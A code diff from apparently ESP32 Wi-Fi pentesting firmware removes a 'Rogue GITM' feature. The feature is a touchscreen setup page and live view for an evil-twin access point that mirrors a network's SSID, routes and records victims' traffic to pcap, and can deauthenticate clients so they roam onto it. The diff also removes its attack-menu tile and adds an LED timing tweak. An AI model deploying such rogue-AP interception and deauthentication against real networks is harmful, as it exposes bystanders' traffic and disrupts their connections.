-            st.upstream_ready ? (upip[0] ? upip : "connected") : "DOWN - no Internet",
-            st.napt_enabled ? "on" : "off", dns, st.dns_proxy ? " (proxy)" : "");
-        lv_obj_set_style_text_color(gitm_live_hdr,
-            st.upstream_ready ? lv_color_make(221, 221, 221) : COLOR_MATERIAL_AMBER, 0);
-    }
-
-    if (gitm_warn_lbl) {
-        if (st.open_network)
-            lv_label_set_text(gitm_warn_lbl, LV_SYMBOL_WARNING " Open AP - anyone in range can join and be recorded.");
-        else
-            lv_label_set_text(gitm_warn_lbl, "");
-    }
-
-    gitm_render_clients();
-
-    if (gitm_cap_label) {
-        const char *base = strrchr(gitm_pcap_path, '/');
-        lv_label_set_text_fmt(gitm_cap_label, "%s\n%lu pkt captured",
-                              base ? base + 1 : (gitm_pcap_path[0] ? gitm_pcap_path : "(pending)"),
-                              (unsigned long)mitm_frame_count);
-    }
-
-    if (gitm_rec_label) {
-        if (mitm_drop_count > 0) {
-            lv_label_set_text_fmt(gitm_rec_label, LV_SYMBOL_WARNING " recorder  DEGRADED - %lu dropped",
-                                  (unsigned long)mitm_drop_count);
-            lv_obj_set_style_text_color(gitm_rec_label, COLOR_MATERIAL_RED, 0);
-        } else {
-            lv_label_set_text(gitm_rec_label, LV_SYMBOL_OK " recorder  no loss");
-            lv_obj_set_style_text_color(gitm_rec_label, COLOR_MATERIAL_GREEN, 0);
-        }
-    }
-}
-
-// ---- Rogue GITM Step 2: configure the SoftAP (Tab5-style) ------------------
-static void gitm_cfg_ta_event_cb(lv_event_t *e)
-{
-    lv_obj_t *ta = lv_event_get_target(e);
-    if (gitm_cfg_kb) {
-        lv_keyboard_set_textarea(gitm_cfg_kb, ta);
-        lv_keyboard_set_mode(gitm_cfg_kb,
-            ta == gitm_cfg_pw_ta ? LV_KEYBOARD_MODE_TEXT_UPPER : LV_KEYBOARD_MODE_TEXT_LOWER);
-        lv_obj_clear_flag(gitm_cfg_kb, LV_OBJ_FLAG_HIDDEN);
-    }
-}
-static void gitm_cfg_kb_event_cb(lv_event_t *e)
-{
-    (void)e;
-    if (gitm_cfg_kb) lv_obj_add_flag(gitm_cfg_kb, LV_OBJ_FLAG_HIDDEN);
-}
-static void gitm_cfg_sec_cb(lv_event_t *e)
-{
-    // 0 = WPA2, 1 = Open. Hide the password field when Open.
-    uint16_t sel = lv_dropdown_get_selected(lv_event_get_target(e));
-    bool hide = (sel == 1);
-    if (gitm_cfg_pw_ta) {
-        if (hide) lv_obj_add_flag(gitm_cfg_pw_ta, LV_OBJ_FLAG_HIDDEN);
-        else      lv_obj_clear_flag(gitm_cfg_pw_ta, LV_OBJ_FLAG_HIDDEN);
-    }
-    if (gitm_cfg_pw_lbl) {
-        if (hide) lv_obj_add_flag(gitm_cfg_pw_lbl, LV_OBJ_FLAG_HIDDEN);
-        else      lv_obj_clear_flag(gitm_cfg_pw_lbl, LV_OBJ_FLAG_HIDDEN);
-    }
-    if (gitm_cfg_pw_eye) {
-        if (hide) lv_obj_add_flag(gitm_cfg_pw_eye, LV_OBJ_FLAG_HIDDEN);
-        else      lv_obj_clear_flag(gitm_cfg_pw_eye, LV_OBJ_FLAG_HIDDEN);
-    }
-}
-// Show/hide the password (same pattern as the Admin Portal field).
-static void gitm_cfg_pw_toggle_cb(lv_event_t *e)
-{
-    (void)e;
-    if (!gitm_cfg_pw_ta) return;
-    bool hidden = lv_textarea_get_password_mode(gitm_cfg_pw_ta);
-    lv_textarea_set_password_mode(gitm_cfg_pw_ta, !hidden);
-    if (gitm_cfg_pw_eye_lbl)
-        lv_label_set_text(gitm_cfg_pw_eye_lbl, hidden ? LV_SYMBOL_EYE_OPEN : LV_SYMBOL_EYE_CLOSE);
-}
-static void gitm_cfg_start_cb(lv_event_t *e)
-{
-    (void)e;
-    if (!gitm_cfg_ssid_ta) return;
-    const char *ssid = lv_textarea_get_text(gitm_cfg_ssid_ta);
-    bool open = (gitm_cfg_sec_dd && lv_dropdown_get_selected(gitm_cfg_sec_dd) == 1);
-    const char *pw = (gitm_cfg_pw_ta && !open) ? lv_textarea_get_text(gitm_cfg_pw_ta) : "";
-
-    if (!ssid || strlen(ssid) < 1 || strlen(ssid) > 32) {
-        if (gitm_cfg_ssid_ta) lv_textarea_set_placeholder_text(gitm_cfg_ssid_ta, "SSID 1-32 chars!");
-        return;
-    }
-    if (!open && (strlen(pw) < 8 || strlen(pw) > 63)) {
-        if (gitm_cfg_pw_ta) lv_textarea_set_placeholder_text(gitm_cfg_pw_ta, "WPA2 needs 8-63 chars");
-        return;
-    }
-    gitm_deauth_mode = gitm_cfg_deauth_dd ? (int)lv_dropdown_get_selected(gitm_cfg_deauth_dd) : 0;
-    strncpy(gitm_ap_ssid, ssid, sizeof(gitm_ap_ssid) - 1); gitm_ap_ssid[sizeof(gitm_ap_ssid) - 1] = '\0';
-    strncpy(gitm_ap_pass, pw, sizeof(gitm_ap_pass) - 1);   gitm_ap_pass[sizeof(gitm_ap_pass) - 1] = '\0';
-    gitm_ap_open = open;
-    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_deauth_dd = gitm_cfg_pw_lbl = NULL;
-    gitm_cfg_pw_eye = gitm_cfg_pw_eye_lbl = gitm_cfg_kb = NULL;
-    show_gitm_page();
-}
-
-static void show_gitm_config_page(void)
-{
-    create_function_page_base("Rogue GITM Setup");
-    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_deauth_dd = gitm_cfg_pw_lbl = NULL;
-    gitm_cfg_pw_eye = gitm_cfg_pw_eye_lbl = gitm_cfg_kb = NULL;
-
-    lv_obj_t *info = lv_label_create(function_page);
-    lv_label_set_long_mode(info, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(info, lv_pct(92));
-    lv_label_set_text_fmt(info, "Uplink: %s (ch %u). Set the AP victims will join - use a distinct name to see it, or the same SSID to mirror.",
-                          wifi_connect_ssid[0] ? wifi_connect_ssid : "(hidden)", wifi_connect_channel);
-    lv_obj_set_style_text_font(info, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(info, lv_color_make(150, 150, 150), 0);
-    lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 34);
-
-    // Two-row grid: text field on the left, dropdown on the right, label above each.
-    // Left column x=12 (field w=264); right column x=290 (dropdown w=178).
-    const int LX = 12, LW = 264, RX = 290, RW = 178;
-    const int R1_LBL = 66, R1_FLD = 86, R2_LBL = 132, R2_FLD = 152;
-
-    // Row 1 left: AP name
-    lv_obj_t *ssid_lbl = lv_label_create(function_page);
-    lv_label_set_text(ssid_lbl, "AP name (SSID)");
-    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);
-    lv_obj_align(ssid_lbl, LV_ALIGN_TOP_LEFT, LX, R1_LBL);
-
-    gitm_cfg_ssid_ta = lv_textarea_create(function_page);
-    lv_textarea_set_one_line(gitm_cfg_ssid_ta, true);
-    lv_textarea_set_text(gitm_cfg_ssid_ta, wifi_connect_ssid);   // default = uplink SSID
-    lv_obj_set_width(gitm_cfg_ssid_ta, LW);
-    lv_obj_align(gitm_cfg_ssid_ta, LV_ALIGN_TOP_LEFT, LX, R1_FLD);
-    lv_obj_add_event_cb(gitm_cfg_ssid_ta, gitm_cfg_ta_event_cb, LV_EVENT_CLICKED, NULL);
-
-    // Row 1 right: Security
-    lv_obj_t *sec_lbl = lv_label_create(function_page);
-    lv_label_set_text(sec_lbl, "Security");
-    lv_obj_set_style_text_font(sec_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(sec_lbl, ui_text_color(), 0);
-    lv_obj_align(sec_lbl, LV_ALIGN_TOP_LEFT, RX, R1_LBL);
-
-    gitm_cfg_sec_dd = lv_dropdown_create(function_page);
-    lv_dropdown_set_options(gitm_cfg_sec_dd, "WPA2\nOpen");
-    lv_dropdown_set_selected(gitm_cfg_sec_dd, wifi_connect_password[0] ? 0 : 1);
-    lv_obj_set_width(gitm_cfg_sec_dd, RW);
-    lv_obj_align(gitm_cfg_sec_dd, LV_ALIGN_TOP_LEFT, RX, R1_FLD);
-    lv_obj_add_event_cb(gitm_cfg_sec_dd, gitm_cfg_sec_cb, LV_EVENT_VALUE_CHANGED, NULL);
-
-    // Row 2 left: Password (label + field hidden together when Open)
-    gitm_cfg_pw_lbl = lv_label_create(function_page);
-    lv_label_set_text(gitm_cfg_pw_lbl, "Password");
-    lv_obj_set_style_text_font(gitm_cfg_pw_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(gitm_cfg_pw_lbl, ui_text_color(), 0);
-    lv_obj_align(gitm_cfg_pw_lbl, LV_ALIGN_TOP_LEFT, LX, R2_LBL);
-
-    gitm_cfg_pw_ta = lv_textarea_create(function_page);
-    lv_textarea_set_one_line(gitm_cfg_pw_ta, true);
-    lv_textarea_set_password_mode(gitm_cfg_pw_ta, true);
-    lv_textarea_set_placeholder_text(gitm_cfg_pw_ta, "8-63 chars");
-    lv_textarea_set_text(gitm_cfg_pw_ta, wifi_connect_password);   // default = uplink password
-    lv_obj_set_width(gitm_cfg_pw_ta, LW - 52);                     // leave room for the eye button
-    lv_obj_align(gitm_cfg_pw_ta, LV_ALIGN_TOP_LEFT, LX, R2_FLD);
-    lv_obj_add_event_cb(gitm_cfg_pw_ta, gitm_cfg_ta_event_cb, LV_EVENT_CLICKED, NULL);
-
-    // Show/hide eye button, right of the password field (like the Admin Portal).
-    gitm_cfg_pw_eye = lv_btn_create(function_page);
-    lv_obj_set_size(gitm_cfg_pw_eye, 46, 38);
-    lv_obj_align_to(gitm_cfg_pw_eye, gitm_cfg_pw_ta, LV_ALIGN_OUT_RIGHT_MID, 6, 0);
-    lv_obj_set_style_bg_color(gitm_cfg_pw_eye, ui_accent_color(), LV_STATE_DEFAULT);
-    lv_obj_set_style_radius(gitm_cfg_pw_eye, 8, 0);
-    gitm_cfg_pw_eye_lbl = lv_label_create(gitm_cfg_pw_eye);
-    lv_label_set_text(gitm_cfg_pw_eye_lbl, LV_SYMBOL_EYE_CLOSE);
-    lv_obj_set_style_text_font(gitm_cfg_pw_eye_lbl, &lv_font_montserrat_16, 0);
-    lv_obj_set_style_text_color(gitm_cfg_pw_eye_lbl, lv_color_white(), 0);
-    lv_obj_center(gitm_cfg_pw_eye_lbl);
-    lv_obj_add_event_cb(gitm_cfg_pw_eye, gitm_cfg_pw_toggle_cb, LV_EVENT_CLICKED, NULL);
-
-    if (!wifi_connect_password[0]) {
-        lv_obj_add_flag(gitm_cfg_pw_ta, LV_OBJ_FLAG_HIDDEN);
-        lv_obj_add_flag(gitm_cfg_pw_lbl, LV_OBJ_FLAG_HIDDEN);
-        lv_obj_add_flag(gitm_cfg_pw_eye, LV_OBJ_FLAG_HIDDEN);
-    }
-
-    // Row 2 right: Deauth mode (Off / Broadcast a separate victim / Targeted unicast)
-    lv_obj_t *da_lbl = lv_label_create(function_page);
-    lv_label_set_text(da_lbl, "Deauth");
-    lv_obj_set_style_text_font(da_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(da_lbl, ui_text_color(), 0);
-    lv_obj_align(da_lbl, LV_ALIGN_TOP_LEFT, RX, R2_LBL);
-
-    gitm_cfg_deauth_dd = lv_dropdown_create(function_page);
-    lv_dropdown_set_options(gitm_cfg_deauth_dd, "Off\nBroadcast\nTargeted");
-    lv_dropdown_set_selected(gitm_cfg_deauth_dd, 0);
-    lv_obj_set_width(gitm_cfg_deauth_dd, RW);
-    lv_obj_align(gitm_cfg_deauth_dd, LV_ALIGN_TOP_LEFT, RX, R2_FLD);
-
-    lv_obj_t *start = lv_btn_create(function_page);
-    lv_obj_set_size(start, 180, 44);
-    lv_obj_align(start, LV_ALIGN_TOP_MID, 0, 210);
-    lv_obj_set_style_bg_color(start, COLOR_MATERIAL_GREEN, 0);
-    lv_obj_set_style_radius(start, 8, 0);
-    lv_obj_set_style_border_width(start, 0, 0);
-    lv_obj_t *start_lbl = lv_label_create(start);
-    lv_label_set_text(start_lbl, LV_SYMBOL_PLAY " Start Gateway");
-    lv_obj_set_style_text_color(start_lbl, lv_color_white(), 0);
-    lv_obj_center(start_lbl);
-    lv_obj_add_event_cb(start, gitm_cfg_start_cb, LV_EVENT_CLICKED, NULL);
-
-    // On-demand keyboard — same size/placement/theme as the rest of the UI
-    // (WiFi Connect / Add home network screens).
-    gitm_cfg_kb = lv_keyboard_create(function_page);
-    lv_keyboard_set_mode(gitm_cfg_kb, LV_KEYBOARD_MODE_TEXT_LOWER);
-    lv_keyboard_set_textarea(gitm_cfg_kb, gitm_cfg_ssid_ta);
-    lv_obj_set_size(gitm_cfg_kb, lv_pct(100), lv_pct(40));
-    lv_obj_align(gitm_cfg_kb, LV_ALIGN_BOTTOM_MID, 0, 0);
-    lv_obj_set_style_bg_color(gitm_cfg_kb, ui_bg_color(), LV_PART_MAIN);
-    lv_obj_set_style_text_color(gitm_cfg_kb, ui_text_color(), LV_PART_MAIN);
-    lv_obj_set_style_bg_color(gitm_cfg_kb, lv_color_make(0, 100, 0), LV_PART_ITEMS);
-    lv_obj_set_style_bg_color(gitm_cfg_kb, lv_color_make(0, 150, 0), LV_PART_ITEMS | LV_STATE_PRESSED);
-    lv_obj_set_style_text_color(gitm_cfg_kb, ui_text_color(), LV_PART_ITEMS);
-    lv_obj_set_style_border_color(gitm_cfg_kb, ui_border_color(), LV_PART_ITEMS);
-    lv_obj_set_style_border_width(gitm_cfg_kb, 1, LV_PART_ITEMS);
-    lv_obj_add_flag(gitm_cfg_kb, LV_OBJ_FLAG_HIDDEN);
-    lv_obj_add_event_cb(gitm_cfg_kb, gitm_cfg_kb_event_cb, LV_EVENT_READY, NULL);
-    lv_obj_add_event_cb(gitm_cfg_kb, gitm_cfg_kb_event_cb, LV_EVENT_CANCEL, NULL);
-}
-
-static void show_gitm_page(void)
-{
-    create_function_page_base("Rogue GITM");
-
-    // The STA uplink is already connected from the WiFi Connect screen. Add the
-    // SoftAP without tearing down STA.
-    // Bring up APSTA correctly (same sequence wifi_attacks uses). A fresh AP netif
-    // must be created with WiFi stopped, then mode set, then WiFi restarted — doing
-    // it while running (or setting APSTA before the netif exists) leaves the AP
-    // interface unusable and capture_gateway_start() fails. The stop/start drops
-    // the STA, so we reconnect it and the IP wait below re-acquires the lease.
-    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap_netif) {
-        esp_wifi_stop();
-        ap_netif = esp_netif_create_default_wifi_ap();
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        esp_wifi_start();
-        apply_wifi_power_settings();
-        vTaskDelay(pdMS_TO_TICKS(300));
-        esp_wifi_connect();               // STA config persists; rejoin the uplink
-    } else {
-        wifi_mode_t mode;
-        esp_wifi_get_mode(&mode);
-        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
-            esp_wifi_set_mode(WIFI_MODE_APSTA);
-            vTaskDelay(pdMS_TO_TICKS(100));
-        }
-    }
-    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
-
-    // --- Tab5-style session view (Step 3) ---
-    lv_obj_t *content = lv_obj_create(function_page);
-    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
-    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
-    lv_obj_set_style_bg_color(content, lv_color_hex(0x0A1A1A), 0);
-    lv_obj_set_style_border_width(content, 0, 0);
-    lv_obj_set_style_pad_all(content, 8, 0);
-    lv_obj_set_style_pad_row(content, 5, 0);
-    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
-    lv_obj_set_scroll_dir(content, LV_DIR_VER);
-
-    // Header row: "Gate-in-the-Middle" + state chip.
-    lv_obj_t *hrow = lv_obj_create(content);
-    lv_obj_set_size(hrow, lv_pct(100), LV_SIZE_CONTENT);
-    lv_obj_set_style_bg_opa(hrow, LV_OPA_TRANSP, 0);
-    lv_obj_set_style_border_width(hrow, 0, 0);
-    lv_obj_set_style_pad_all(hrow, 0, 0);
-    lv_obj_set_flex_flow(hrow, LV_FLEX_FLOW_ROW);
-    lv_obj_set_flex_align(hrow, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-    lv_obj_clear_flag(hrow, LV_OBJ_FLAG_SCROLLABLE);
-
-    lv_obj_t *htitle = lv_label_create(hrow);
-    lv_label_set_text(htitle, LV_SYMBOL_LOOP " Gate-in-the-Middle");
-    lv_obj_set_style_text_font(htitle, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(htitle, COLOR_MATERIAL_TEAL, 0);
-
-    gitm_state_chip = lv_label_create(hrow);
-    lv_label_set_text(gitm_state_chip, "IDLE");
-    lv_obj_set_style_text_font(gitm_state_chip, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(gitm_state_chip, lv_color_make(136, 136, 136), 0);
-    lv_obj_set_style_bg_color(gitm_state_chip, lv_color_hex(0x102020), 0);
-    lv_obj_set_style_bg_opa(gitm_state_chip, LV_OPA_COVER, 0);
-    lv_obj_set_style_pad_hor(gitm_state_chip, 8, 0);
-    lv_obj_set_style_pad_ver(gitm_state_chip, 4, 0);
-    lv_obj_set_style_radius(gitm_state_chip, 6, 0);
-
-    // Shared hint / error line.
-    gitm_status_label = lv_label_create(content);
-    lv_label_set_long_mode(gitm_status_label, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(gitm_status_label, lv_pct(100));
-    lv_label_set_text(gitm_status_label, "Starting gateway...");
-    lv_obj_set_style_text_font(gitm_status_label, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(gitm_status_label, COLOR_MATERIAL_AMBER, 0);
-
-    // AP / uplink / NAPT-DNS block.
-    gitm_live_hdr = lv_label_create(content);
-    lv_label_set_text(gitm_live_hdr, "AP       ...\nUplink   ...\nNAPT ...");
-    lv_obj_set_style_text_font(gitm_live_hdr, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(gitm_live_hdr, lv_color_make(221, 221, 221), 0);
-
-    gitm_warn_lbl = lv_label_create(content);
-    lv_label_set_long_mode(gitm_warn_lbl, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(gitm_warn_lbl, lv_pct(100));
-    lv_label_set_text(gitm_warn_lbl, "");
-    lv_obj_set_style_text_font(gitm_warn_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(gitm_warn_lbl, COLOR_MATERIAL_AMBER, 0);
-
-    gitm_clients_hdr = lv_label_create(content);
-    lv_label_set_text(gitm_clients_hdr, "Clients (0)");
-    lv_obj_set_style_text_font(gitm_clients_hdr, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(gitm_clients_hdr, COLOR_MATERIAL_TEAL, 0);
-
-    gitm_clients_list = lv_obj_create(content);
-    lv_obj_set_size(gitm_clients_list, lv_pct(100), 74);
-    lv_obj_set_style_bg_color(gitm_clients_list, lv_color_hex(0x061212), 0);
-    lv_obj_set_style_border_color(gitm_clients_list, lv_color_hex(0x1A3333), 0);
-    lv_obj_set_style_border_width(gitm_clients_list, 1, 0);
-    lv_obj_set_style_radius(gitm_clients_list, 6, 0);
-    lv_obj_set_style_pad_all(gitm_clients_list, 5, 0);
-    lv_obj_set_style_pad_row(gitm_clients_list, 3, 0);
-    lv_obj_set_flex_flow(gitm_clients_list, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_scroll_dir(gitm_clients_list, LV_DIR_VER);
-
-    gitm_cap_label = lv_label_create(content);
-    lv_label_set_text(gitm_cap_label, "(pending)\n0 pkt captured");
-    lv_obj_set_style_text_font(gitm_cap_label, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(gitm_cap_label, lv_color_make(180, 180, 180), 0);
-
-    gitm_rec_label = lv_label_create(content);
-    lv_label_set_text(gitm_rec_label, LV_SYMBOL_OK " recorder  no loss");
-    lv_obj_set_style_text_font(gitm_rec_label, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(gitm_rec_label, COLOR_MATERIAL_GREEN, 0);
-
-    // Button row: Back (to Setup, keeps the uplink) + Stop & Exit (to menu).
-    lv_obj_t *btn_row = lv_obj_create(content);
-    lv_obj_set_size(btn_row, lv_pct(100), 46);
-    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
-    lv_obj_set_style_border_width(btn_row, 0, 0);
-    lv_obj_set_style_pad_all(btn_row, 0, 0);
-    lv_obj_set_style_pad_column(btn_row, 8, 0);
-    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
-    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
-
-    lv_obj_t *back_btn = lv_btn_create(btn_row);
-    lv_obj_set_size(back_btn, 150, 42);
-    lv_obj_set_style_bg_color(back_btn, lv_color_make(80, 80, 80), 0);
-    lv_obj_set_style_radius(back_btn, 8, 0);
-    lv_obj_set_style_border_width(back_btn, 0, 0);
-    lv_obj_t *back_lbl = lv_label_create(back_btn);
-    lv_label_set_text(back_lbl, LV_SYMBOL_LEFT " Back");
-    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
-    lv_obj_center(back_lbl);
-    lv_obj_add_event_cb(back_btn, gitm_back_btn_cb, LV_EVENT_CLICKED, NULL);
-
-    lv_obj_t *stop_btn = lv_btn_create(btn_row);
-    lv_obj_set_size(stop_btn, 150, 42);
-    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
-    lv_obj_set_style_radius(stop_btn, 8, 0);
-    lv_obj_set_style_border_width(stop_btn, 0, 0);
-    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
-    lv_label_set_text(stop_lbl, LV_SYMBOL_STOP " Stop & Exit");
-    lv_obj_set_style_text_color(stop_lbl, lv_color_white(), 0);
-    lv_obj_center(stop_lbl);
-    lv_obj_add_event_cb(stop_btn, gitm_stop_btn_cb, LV_EVENT_CLICKED, NULL);
-
-    gitm_set_state(GITM_ST_CONNECTING);
-    lv_refr_now(NULL);
-
-    if (!ap_netif || !sta_netif) {
-        lv_label_set_text(gitm_status_label, "AP/STA netif unavailable");
-        gitm_set_state(GITM_ST_ERROR);
-        esp_wifi_set_mode(WIFI_MODE_STA);
-        return;
-    }
-
-    // Wait for the STA uplink to actually hold an IPv4 (association fires before
-    // DHCP; the APSTA switch can re-run it). Same 12s helper as WiGLE/WPA-SEC/Nmap.
-    lv_label_set_text(gitm_status_label, "Waiting for uplink IP...");
-    lv_refr_now(NULL);
-    if (!upload_wait_for_sta_ip(12000)) {
-        lv_label_set_text(gitm_status_label, "No uplink IP - check network/password");
-        gitm_set_state(GITM_ST_ERROR);
-        esp_wifi_set_mode(WIFI_MODE_STA);
-        return;
-    }
-
-    gitm_set_state(GITM_ST_STARTING);
-    lv_label_set_text(gitm_status_label, "Bringing up gateway...");
-    lv_refr_now(NULL);
-
-    // SoftAP with the configured name/security, routed via NAPT.
-    capture_gateway_config_t cfg = {
-        .ssid        = gitm_ap_ssid,
-        .password    = (gitm_ap_open || gitm_ap_pass[0] == '\0') ? NULL : gitm_ap_pass,
-        .channel     = wifi_connect_channel,
-        .max_clients = 4,
-    };
-    esp_err_t err = capture_gateway_start(ap_netif, sta_netif, &cfg);
-    if (err != ESP_OK) {
-        lv_label_set_text_fmt(gitm_status_label, "Gateway start failed: %s", esp_err_to_name(err));
-        gitm_set_state(GITM_ST_ERROR);
-        esp_wifi_set_mode(WIFI_MODE_STA);
-        return;
-    }
-
-    gitm_capture_start(ap_netif);   // pcap tap on the AP netif; cap_label filled by the timer
-
-    gitm_active = true;
-    int victims = 0;
-    if (gitm_deauth_mode == 1) {          // broadcast the selected victim APs (uplink excluded)
-        victims = gitm_deauth_start();
-        if (victims > 0)
-            lv_label_set_text_fmt(gitm_status_label,
-                "Broadcast deauth: %d victim AP(s) on ch %u - matching-SSID clients roam onto us.",
-                victims, wifi_connect_channel);
-        else
-            lv_label_set_text(gitm_status_label,
-                "No separate same-channel victim selected; gateway live (no deauth).");
-    } else if (gitm_deauth_mode == 2) {   // targeted unicast of the target APs' clients
-        victims = gitm_td_start();
-        if (victims > 0)
-            lv_label_set_text_fmt(gitm_status_label,
-                "Targeted deauth: sniffing + unicast-kicking clients of %d AP(s) on ch %u.",
-                victims, wifi_connect_channel);
-        else
-            lv_label_set_text(gitm_status_label,
-                "No same-channel target for targeted deauth; gateway live (no deauth).");
-    } else {
-        lv_label_set_text(gitm_status_label,
-            "Gateway live. Clients that join the AP are routed (NAPT) + recorded.");
-    }
-    lv_obj_set_style_text_color(gitm_status_label, lv_color_make(150, 150, 150), 0);
-    gitm_set_state(GITM_ST_RUNNING);
-
-    gitm_timer = lv_timer_create(gitm_timer_cb, 1000, NULL);
-    gitm_timer_cb(NULL);   // populate the live view immediately
-    ESP_LOGI(TAG, "Rogue GITM active: AP='%s' (%s) ch=%u victims=%d",
-             gitm_ap_ssid, gitm_ap_open ? "open" : "wpa2", wifi_connect_channel, victims);
-}
-
 static void rogue_ap_exit_cb(lv_event_t *e)
 {
     (void)e;
@@ -16832,8 +15912,6 @@ static void show_attack_tiles_screen(void)
         create_small_tile(attack_tiles, LV_SYMBOL_SHUFFLE, "ARP", COLOR_MATERIAL_TEAL, attack_tile_event_cb, "ARP Poison");
         create_small_tile(attack_tiles, LV_SYMBOL_LOOP, "MITM", lv_color_make(121, 85, 72), attack_tile_event_cb, "MITM");
         create_small_tile(attack_tiles, LV_SYMBOL_WIFI, "Rogue AP", COLOR_MATERIAL_INDIGO, attack_tile_event_cb, "Rogue AP");
-        // Rogue GITM: routed capture gateway (STA uplink ↔ mirror SoftAP + NAPT + pcap).
-        create_small_tile(attack_tiles, LV_SYMBOL_LOOP, "Rogue GITM", lv_color_make(0, 121, 107), attack_tile_event_cb, "Rogue GITM");
     }
     // Recon tiles — always available.
     // Nmap: connect to the selected network (STA), then scan its LAN
@@ -21553,6 +20631,7 @@ static void lookout_led_set(uint8_t r, uint8_t g, uint8_t b)
 static void feature_led_update(void)
 {
     static int last_r = -1, last_g = -1, last_b = -1;
+    static int64_t scan_done_led_us = 0;   // when the green "scan done" flash began (0 = not yet)
 
     // Priority 1: BT Lookout alert flash owns the LED while flashing.
     if (lookout_screen_active && bt_lookout_tick(lookout_led_set)) {
@@ -21595,10 +20674,15 @@ static void feature_led_update(void)
     // All gated on the screen flag so the LED goes dark the instant we leave,
     // even if a background scan is still finishing.
     else if (scan_attack_screen_active && wifi_scanner_is_scanning())
-                                                        { r = 0;  g = 0;  b = 80; } // blue — active AP scan
+                                                        { r = 0;  g = 0;  b = 80; scan_done_led_us = 0; } // blue — active AP scan
     else if (scan_attack_screen_active && inspect_active)
-                                                        { r = 0;  g = 60; b = 60; } // teal — passive results sniff
-    else if (scan_attack_screen_active)                 { r = 0;  g = 50; b = 0;  } // green — scan done, results up
+                                                        { r = 0;  g = 60; b = 60; scan_done_led_us = 0; } // teal — passive results sniff
+    else if (scan_attack_screen_active) {
+        // Done: flash green for 2 s, then go dark (the results screen stays up).
+        if (scan_done_led_us == 0) scan_done_led_us = esp_timer_get_time();
+        if (esp_timer_get_time() - scan_done_led_us < 2000000LL) { r = 0; g = 50; b = 0; } // green — just finished
+        else                                                     { r = 0; g = 0;  b = 0;  } // then off
+    }
     // ── Idle (off) ───────────────────────────────────────────────────────
     // (No ungated wifi_scanner_is_scanning() branch: a background scan finishing
     //  after we leave the screen must not relight the LED.)
